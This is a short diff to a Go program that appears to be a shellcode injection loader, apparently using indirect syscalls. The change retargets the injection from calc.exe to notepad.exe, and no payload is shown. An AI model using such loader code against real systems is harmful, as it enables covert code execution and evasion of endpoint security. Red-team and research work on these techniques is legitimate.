@@ -209,7 +209,7 @@ func main() {
 		return
 	}
 
-	exePath := "C:\\Windows\\System32\\calc.exe"
+	exePath := "C:\\Windows\\System32\\notepad.exe"
 	println("[*] Injecting shellcode into process: ", exePath)
 	loader, err := Indirect.Init()
 	if err != nil {
